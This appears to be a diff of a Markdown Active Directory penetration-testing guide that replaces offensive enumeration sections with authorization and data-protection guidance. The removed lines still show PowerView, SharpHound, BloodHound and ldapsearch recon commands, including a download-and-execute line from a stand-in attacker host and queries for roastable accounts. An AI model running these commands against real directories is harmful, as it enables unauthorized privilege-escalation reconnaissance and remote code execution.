@@ -82,110 +82,32 @@ Forest
 ---
 
 ## Enumeration & Reconnaissance
-
+ 
+Directory inventories and relationship graphs can expose sensitive accounts, sessions, delegation, and privilege paths. Collect only what the approved assessment needs, use the least-privileged approved identity, and protect exports as sensitive security data.
+ 
+```mermaid
+flowchart LR
+    A[Confirm owner, scope,<br/>and written authorization] --> M[Choose approved methods<br/>and least privilege]
+    M --> S[Limit collection to<br/>required objects and data]
+    S --> P[Protect exports,<br/>access, and retention]
+    P --> V[Validate findings with<br/>directory owners and evidence]
+    V --> R[Remediate by change process<br/>and delete expired exports]
+```
+ 
 ### PowerView
-
-```powershell
-# Import PowerView
-Import-Module .\PowerView.ps1
-# or IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')
-
-# Domain information
-Get-Domain
-Get-DomainController
-Get-DomainTrust
-Get-ForestTrust
-
-# User enumeration
-Get-DomainUser
-Get-DomainUser -Properties name,memberof,description,lastlogon,pwdlastset
-Get-DomainUser -Identity jsmith
-Get-DomainUser -AdminCount 1   # Find admin accounts
-
-# Group enumeration
-Get-DomainGroup
-Get-DomainGroupMember -Identity "Domain Admins" -Recurse
-Get-DomainGroupMember -Identity "Enterprise Admins"
-
-# Computer enumeration
-Get-DomainComputer -Properties name,operatingsystem,lastlogon
-Get-DomainComputer -OperatingSystem "*Server*"
-Get-DomainController -Domain corp.local
-
-# Find where users are logged in
-Get-NetLoggedon -ComputerName DC01
-Get-NetSession -ComputerName DC01
-Find-DomainUserLocation -UserName "DA_User"   # Find where DA is logged in
-
-# ACL/permission enumeration
-Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
-Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs | 
-  Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl"}
-
-# Find misconfigured ACLs (path to DA via ACL abuse)
-Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -notmatch "Domain Admins|Enterprise Admins|SYSTEM"}
-
-# GPO enumeration
-Get-DomainGPO
-Get-DomainGPOUserLocalGroupMapping   # GPOs granting local admin
-
-# Share enumeration
-Find-DomainShare
-Find-InterestingDomainShareFile -Include *.txt,*.ps1,*.xml,*.config
-```
-
+ 
+For an approved inventory, review domain and forest configuration, privileged group membership, service identities and SPNs, delegation, GPO ownership, trust relationships, and effective ACLs. Confirm data freshness and the account/host scope used. Avoid downloading scripts from untrusted locations or treating an ACL path as proof of exploitability.
+ 
 ### BloodHound
-
-BloodHound maps attack paths through AD by analyzing ACLs, group memberships, and session data.
-
-```bash
-# Collect data with SharpHound
-.\SharpHound.exe -c All --zipfilename bloodhound_data.zip
-.\SharpHound.exe -c DCOnly    # DC-only, less noise
-.\SharpHound.exe -c All --stealth  # Slower but quieter
-
-# Run BloodHound
-neo4j console &
-bloodhound &
-# Upload zip file via GUI
-
-# Useful Cypher queries
-# Find shortest path to Domain Admins
-MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p
-
-# Find all DA sessions on non-DC hosts
-MATCH (u:User)-[:MemberOf]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}),
-      (c:Computer)-[:HasSession]->(u)
-WHERE NOT c.name ENDS WITH ".DC.CORP.LOCAL"
-RETURN u.name, c.name
-
-# Find Kerberoastable accounts with DA path
-MATCH (u:User {hasspn:true}) WHERE u.admincount = true RETURN u.name
-
-# Find computers where DA is admin
-MATCH (g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})-[:AdminTo]->(c:Computer) RETURN c.name
-```
-
+ 
+BloodHound graph data can expose sensitive identity relationships, sessions, and possible privilege paths. Use only an owner-approved collection profile and scope; confirm its data categories and permissions before collection. A graph edge is a review lead, not proof that an account is compromised or a path is usable. Limit access to the database and export, document provenance and collection time, and apply retention and deletion rules.
+ 
 ### LDAP Enumeration
-
-```bash
-# ldapsearch (Linux)
-ldapsearch -H ldap://DC01.corp.local -x -b "DC=corp,DC=local" \
-  -D "corp\user" -w "Password1" "(objectClass=user)" cn sAMAccountName
-
-# Enumerate users without authentication (null bind - often disabled)
-ldapsearch -H ldap://DC01.corp.local -x -b "DC=corp,DC=local" "(objectClass=user)"
-
-# Find accounts with password not required
-ldapsearch -H ldap://DC01 -x -b "DC=corp,DC=local" \
-  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" cn
-
-# Find accounts that don't require Kerberos pre-auth (AS-REP roastable)
-ldapsearch -H ldap://DC01 -x -b "DC=corp,DC=local" \
-  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" cn
-```
-
----
+ 
+LDAP returns information according to server policy and the querying identity's effective rights. Anonymous access varies by configuration and is commonly restricted; do not assume a null bind is permitted or use one outside an explicitly approved test. For authorized reviews, use the approved directory client and account, protect query results, and validate account-control flags against effective directory policy before making a finding.
+ 
+Microsoft's [Active Directory Security Assessment](https://learn.microsoft.com/en-us/services-hub/microsoft-engage-center/health/ads-assessment-prerequisites) describes the extensive permissions and remote protocols required by its assessment tool; use its current prerequisites when choosing an assessment method. Microsoft's [AD DS authorization model](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/4e11a7e6-e18c-46e4-a781-3ca2b4de6f30) explains that access is controlled through directory-object ACLs and that anonymous operations depend on configuration.
+ 
 
 ## Credential Attacks
  
